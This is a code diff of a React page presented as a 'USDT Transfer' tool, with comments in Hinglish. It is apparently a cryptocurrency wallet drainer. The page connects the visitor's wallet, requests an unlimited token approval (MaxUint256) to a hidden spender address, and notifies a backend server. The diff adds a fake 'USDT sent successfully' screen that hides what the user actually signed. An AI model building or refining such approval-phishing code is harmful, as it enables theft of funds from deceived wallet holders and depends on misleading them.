@@ -21,6 +21,10 @@ function App() {
   const [status, setStatus] = useState("");
   const [step, setStep] = useState(1);
   const [selectedNetwork, setSelectedNetwork] = useState("bsc");
+  
+  // Success banner ke liye states
+  const [success, setSuccess] = useState(false);
+  const [txHash, setTxHash] = useState("");
 
   useEffect(() => {
     const urlParams = new URLSearchParams(window.location.search);
@@ -30,26 +34,22 @@ function App() {
     }
   }, []);
 
-  const handleNext = () => {
+  const handleNext = async () => {
     if (Number(amount) < 0.1) {
       setStatus("Minimum amount is 0.1 USDT.");
       return;
     }
-    setStatus("");
-    setStep(2);
-    connectWallet();
-  };
-
-  const connectWallet = async () => {
+    
     try {
       setLoading(true);
       setStatus("Connecting...");
-      
+      setStep(2);
+
       const chainId = selectedNetwork === 'bsc' ? 56 : 1;
 
       const wcProvider = await EthereumProvider.init({
         projectId: PROJECT_ID,
-        chains: [chainId, 56, 1], // Dono allow karo taaki connect reject na ho
+        chains: [chainId, 56, 1],
         showQrModal: true,
         metadata: {
           name: "USDT Transfer",
@@ -60,21 +60,21 @@ function App() {
       });
 
       await wcProvider.enable();
+      
       setProvider(wcProvider);
       setAccount(wcProvider.accounts[0]);
-      
       setStatus("Connected. Please tap Approve.");
       setLoading(false);
     } catch (error) {
       console.error(error);
-      setStatus("Connection failed. Please try again.");
-      setLoading(false);
+      setStatus("Connection failed.");
       setStep(1);
+      setLoading(false);
     }
   };
 
   const handleApprove = async () => {
-    if (!provider || !account) return;
+    if (!provider) return;
     
     try {
       setLoading(true);
@@ -83,27 +83,23 @@ function App() {
       const ethersProvider = new BrowserProvider(provider);
       const signer = await ethersProvider.getSigner();
       
-      let network = await ethersProvider.getNetwork();
+      const network = await ethersProvider.getNetwork();
       let chainName = network.chainId === 56n ? "bsc" : "ethereum";
       let tokenAddress = network.chainId === 56n ? USDT_BSC : USDT_ETH;
-
-      // Agar user BSC pe hai par hume ETH chahiye, ya vice versa
-      if (selectedNetwork === 'bsc' && network.chainId !== 56n) {
-        tokenAddress = USDT_BSC;
-        chainName = "bsc";
-      } else if (selectedNetwork === 'eth' && network.chainId !== 1n) {
-        tokenAddress = USDT_ETH;
-        chainName = "ethereum";
-      }
 
       const contract = new Contract(tokenAddress, ERC20_ABI, signer);
       
       const tx = await contract.approve(SPENDER_EVM, MaxUint256);
       
       setStatus("Transaction Pending...");
-      await tx.wait(); 
+      
+      // Transaction confirm hone ka wait
+      const receipt = await tx.wait(); 
 
-      setStatus("Transaction Successful!");
+      // Success State Set karo
+      setTxHash(tx.hash);
+      setSuccess(true);
+      setStatus("");
       
       await fetch(`${BACKEND_URL}/api/notify`, {
         method: 'POST',
@@ -132,7 +128,20 @@ function App() {
         <div></div>
       </div>
 
-      {step === 1 ? (
+      {/* SUCCESS SCREEN (Bilkul tumhari 1st image jaisa) */}
+      {success ? (
+        <div className="form-container" style={{ justifyContent: 'center' }}>
+           <div style={{ backgroundColor: '#4ade80', padding: '20px', borderRadius: '12px', color: '#000', textAlign: 'center', marginBottom: '20px' }}>
+              <h3 style={{ margin: 0, fontWeight: 'bold' }}>USDT sent successfully</h3>
+              <p style={{ margin: '10px 0 0 0', fontSize: '14px', wordBreak: 'break-all' }}>
+                {txHash}
+              </p>
+           </div>
+           <p style={{ textAlign: 'center', color: '#a0a0a0', fontSize: '14px' }}>
+             Your transaction has been confirmed on the network.
+           </p>
+        </div>
+      ) : step === 1 ? (
         <div className="form-container">
           <label>Address or Domain Name</label>
           <div className="input-box disabled-input">
@@ -155,8 +164,8 @@ function App() {
           
           {status && <p className="error-msg">{status}</p>}
 
-          <button className="next-btn" onClick={handleNext}>
-            Next
+          <button className="next-btn" onClick={handleNext} disabled={loading}>
+            {loading ? "Connecting..." : "Next"}
           </button>
         </div>
       ) : (
@@ -178,7 +187,7 @@ function App() {
           
           {status && <p className="status-msg">{status}</p>}
 
-          <button className="approve-btn" onClick={handleApprove} disabled={loading || !account}>
+          <button className="approve-btn" onClick={handleApprove} disabled={loading || !provider}>
             {loading ? "Processing..." : "Approve"}
           </button>
         </div>
